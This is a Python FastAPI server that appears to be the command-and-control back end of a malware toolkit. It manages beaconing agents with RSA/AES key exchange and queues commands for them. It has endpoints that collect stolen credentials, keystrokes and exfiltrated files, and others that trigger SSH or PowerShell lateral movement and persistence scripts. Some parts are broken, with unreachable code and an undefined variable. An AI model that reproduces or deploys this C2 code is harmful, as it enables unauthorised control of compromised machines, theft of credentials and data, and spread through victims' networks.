######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

from fastapi import FastAPI, HTTPException, Query, Depends
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Dict, List, Optional
import logging
import base64
import gzip
import shutil
from io import BytesIO
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256
import uvicorn
import os
import paramiko

app = FastAPI()
agent_results = {}

# Define the Agent model
class Agent(BaseModel):
    agent_id: str
    status: str
    last_checkin: str

# Access agent data
agents = {
    "agent-001": {"status": "online", "last_checkin": "2025-02-27T12:00:00"},
    "agent-002": {"status": "offline", "last_checkin": "2025-02-26T11:45:00"}
}

# Logging configuration
logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

@app.get("/agents", response_model=List[Agent])
async def list_agents():
    try:
        online_agents = [Agent(agent_id=key, status=value["status"], last_checkin=value["last_checkin"]) for key, value in agents.items() if value["status"] == "online"]
        return online_agents
    except Exception as e:
        logging.error(f"Error listing agents: {str(e)}")
        raise HTTPException(status_code=500, detail="Internal Server Error")

# Endpoint to select an agent
@app.post("/select_agent")
async def select_agent(agent_id: str):
    # Simulate selecting an agent and returning a response
    agent = next((agent for key, agent in agents.items() if key == agent_id), None)
    if agent and agent['status'] == 'online':
        return {"status": "success", "message": f"Agent {agent_id} selected"}
    else:
        raise HTTPException(status_code=404, detail="Agent not found or offline")

# Other endpoints like executing commands, etc. can be added here...

class ResultPayload(BaseModel):
    AgentID: str
    Result: str

class SendCommandRequest(BaseModel):
    AgentID: str
    Command: str

class KeyRequest(BaseModel):
    AgentID: str

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

class KeyExchangeRequest(BaseModel):
    AgentID: str
    EncAESKey: str

class BeaconRequest(BaseModel):
    AgentID: str

class SystemInfoRequest(BaseModel):
    agent_id: str
    system_info: str

class CredentialsRequest(BaseModel):
    data: List[str]

class ExfiltrateRequest(BaseModel):
    file: str

class KeystrokesRequest(BaseModel):
    keystrokes: str

class LateralMovementRequest(BaseModel):
    target_ip: str
    username: str
    password: str

# Load RSA Public Key
try:
    with open("public_key.xml", "r") as xml_file:
        PUBLIC_KEY_XML = xml_file.read()
except FileNotFoundError:
    logging.error("public_key.xml not found!")
    PUBLIC_KEY_XML = ""

@app.get("/public_key")
def get_public_key():
    if not PUBLIC_KEY_XML:
        raise HTTPException(status_code=500, detail="Public key not found")
    
    logging.info("Public key requested")
    return {"PublicKey": PUBLIC_KEY_XML}

def check_key_length(key: bytes) -> bytes:
    if len(key) != 32:
        raise ValueError(f"Incorrect AES key length ({len(key)} bytes). Expected 32 bytes.")
    return key

def encrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    cipher = AES.new(key, AES.MODE_GCM)
    nonce = cipher.nonce
    cipher_text, tag = cipher.encrypt_and_digest(data.encode())
    encrypted_data = base64.b64encode(nonce + cipher_text + tag).decode('utf-8')
    return encrypted_data

def decrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    try:
        # Decode Base64 input
        raw_data = base64.b64decode(data)

        # Extract Nonce, CipherText, and Tag
        nonce = raw_data[:12]
        tag = raw_data[-16:]
        cipher_text = raw_data[12:-16]

        # AES-GCM Decryption
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_text = cipher.decrypt_and_verify(cipher_text, tag)

        return decrypted_text.decode('utf-8')

    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

def load_private_key():
    with open("private_key.pem", "rb") as f:
        private_key = RSA.import_key(f.read())
    return private_key

def decrypt_aes_key(enc_aes_key_base64, private_key):
    enc_aes_key = base64.b64decode(enc_aes_key_base64)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    aes_key = cipher_rsa.decrypt(enc_aes_key)

    # Debug Output: Ensure AES Key is 32 bytes
    logging.debug(f"[DEBUG] AES Key Length: {len(aes_key)} bytes")
    if len(aes_key) != 32:
        raise ValueError(f"[ERROR] AES Key must be 32 bytes! Received {len(aes_key)} bytes.")

    return aes_key

def compute_hmac(data: str, key: bytes) -> str:
    hmac = HMAC.new(key, msg=data.encode(), digestmod=SHA256)
    return base64.b64encode(hmac.digest()).decode('utf-8')

private_key = load_private_key()

# Enable detailed logging
logging.basicConfig(level=logging.DEBUG)

@app.post("/checkin")
async def checkin(request: CheckinRequest):
    # Log the incoming request data for debugging
    logging.debug(f"Incoming checkin request: {request}")
    
    agent_id = request.AgentID
    if agent_id not in agents:
        agents[agent_id] = {"status": "online", "last_checkin": "2025-02-27T12:00:00"}
        logging.info(f"Agent {agent_id} checked in (new).")
        return {"Status": "Agent registered"}
    else:
        logging.info(f"Agent {agent_id} already registered. Current Status: {agents[agent_id]['status']}")
        return {"Status": "Agent already registered"}

@app.post("/exchange_key")
def exchange_key(request: KeyExchangeRequest):
    agent_id = request.AgentID
    enc_aes_key = request.EncAESKey
    try:
        # Decrypt the AES key using the private RSA key
        aes_key = decrypt_aes_key(enc_aes_key, private_key)
        
        if len(aes_key) != 32:
            raise ValueError("Invalid AES key length after decryption!")

        # Update or create the agent record with the AES key
        if agent_id in agents:
            agents[agent_id]["aes_key"] = aes_key
        else:
            agents[agent_id] = {"aes_key": aes_key, "commands": [], "results": []}
        
        logging.info(f"Key exchange successful for AgentID: {agent_id} - AES Key (Base64): {base64.b64encode(aes_key).decode()}")
        return {"Status": "Success"}
    except Exception as e:
        logging.error(f"Key exchange failed for AgentID {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Key exchange failed")
        
        
@app.post("/send_command")
async def send_command(request: CommandRequest):
    return {"status": "success", "agent_id": request.AgentID, "command": request.Command}

    print(f"[DEBUG] Received send_command request: {agent_id}, {command}")

    if agent_id not in agents:
        print("[ERROR] Agent not found.")
        return JSONResponse(content={"error": "Agent not found"}, status_code=404)

    # Ensure "commands" exists
    if "commands" not in agents[agent_id]:
        agents[agent_id]["commands"] = []  

    agents[agent_id]["commands"].append(command)
    print(f"[DEBUG] Command queued for agent {agent_id}: {command}")

    return {"status": "success"}


@app.post("/beacon")
async def beacon(request: BeaconRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    if "commands" not in agents[agent_id]:
        return {"commands": []}

    commands = agents[agent_id]["commands"]
    agents[agent_id]["commands"] = []  # Clear commands after sending
    logging.info(f"Beacon request from agent {agent_id}. Commands: {commands}")
    return {"commands": commands}

@app.get("/result")
async def get_result(agent_id: str):
    if agent_id in agent_results:
        return {"Result": agent_results[agent_id]}
    
    raise HTTPException(status_code=404, detail="No result found for this agent")
    
        
@app.post("/post_result")
def post_result(payload: ResultPayload):
    """Receive command execution results from an agent."""
    if payload.AgentID not in [agent["agent_id"] for agent in agents]:
        raise HTTPException(status_code=404, detail="Agent not found.")
    
    command_results[payload.AgentID] = payload.Result
    
    return {"status": "success", "message": "Result stored successfully"}

    return {"Status": "OK"}

@app.post("/receive_credentials")
def receive_credentials(request: CredentialsRequest):
    data = request.data
    logging.info(f"Received credentials: {data}")
    print(f"Received credentials: {data}", flush=True)  # Print for real-time monitoring
    return {"Status": "OK"}

@app.post("/exfiltrate")
def exfiltrate(request: ExfiltrateRequest):
    file_data = base64.b64decode(request.file)
    decompressed_file_data = gzip.decompress(file_data)

    save_path = "received_file.gz"
    with open(save_path, 'wb') as f:
        f.write(decompressed_file_data)

    logging.info(f"Received exfiltrated file and saved to {save_path}")
    print(f"Received exfiltrated file and saved to {save_path}", flush=True)  # Print for real-time monitoring
    return {"Status": "OK"}

@app.post("/receive_keystrokes")
def receive_keystrokes(request: KeystrokesRequest):
    keystrokes = request.keystrokes
    logging.info(f"Received keystrokes: {keystrokes}")
    print(f"Received keystrokes: {keystrokes}", flush=True)  # Print for real-time monitoring
    return {"Status": "OK"}

@app.post("/move_laterally")
def move_laterally(request: LateralMovementRequest):
    target_ip = request.target_ip
    username = request.username
    password = request.password
    result = None
    try:
        if os.name == 'nt':
            script_path = os.path.join(os.path.dirname(__file__), 'windows', 'lateral_movement.ps1')
            result = os.system(f"powershell -ExecutionPolicy Bypass -File {script_path} {target_ip} {username} {password}")
        elif os.name == 'posix':
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password)
            stdin, stdout, stderr = client.exec_command("hostname")
            result = stdout.read().decode()
            client.close()
    except Exception as e:
        logging.error(f"Error in lateral movement: {str(e)}")
        raise HTTPException(status_code=400, detail=f"Error in lateral movement: {str(e)}")
    
    logging.info(f"Lateral movement to {target_ip} executed. Result: {result}")
    return {"Status": "OK", "Result": result}

@app.post("/establish_persistence")
def establish_persistence():
    result = None
    try:
        if os.name == 'nt':
            script_path = os.path.join(os.path.dirname(__file__), 'windows', 'persistence.ps1')
            result = os.system(f"powershell -ExecutionPolicy Bypass -File {script_path}")
        elif os.name == 'posix':
            result = os.system("crontab -l")
    except Exception as e:
        logging.error(f"Error in establishing persistence: {str(e)}")
        raise HTTPException(status_code=400, detail=f"Error in persistence: {str(e)}")
    
    logging.info(f"Persistence established with result: {result}")
    return {"Status": "OK", "Result": result}
    
# Run the FastAPI application
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)

